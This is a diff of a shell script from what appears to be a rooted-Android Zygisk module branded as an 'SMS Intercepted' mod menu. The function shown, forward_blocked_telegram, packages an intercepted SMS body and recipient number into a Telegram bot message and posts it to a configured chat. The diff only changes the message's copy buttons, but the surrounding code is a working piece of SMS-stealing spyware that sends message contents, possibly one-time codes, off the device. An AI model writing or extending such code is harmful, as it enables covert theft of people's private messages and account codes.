@@ -904,18 +904,17 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # User format — message + one-tap copy same layout
-  ONE_TAP="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
+  # Chat message format
+  TEXT="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
 To ${TO_NUM}
 Message: ${MSG_BODY}"
-  TEXT="$ONE_TAP"
 
   ESC_TEXT=$(tg_json_escape "$TEXT")
-  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
   ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
   ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📞 Copy To\",\"copy_text\":{\"text\":\"${ESC_TO}\"}}],[{\"text\":\"💬 Copy Message\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
+  # Two buttons: number copy + full SMS copy
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
   SENT=0
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
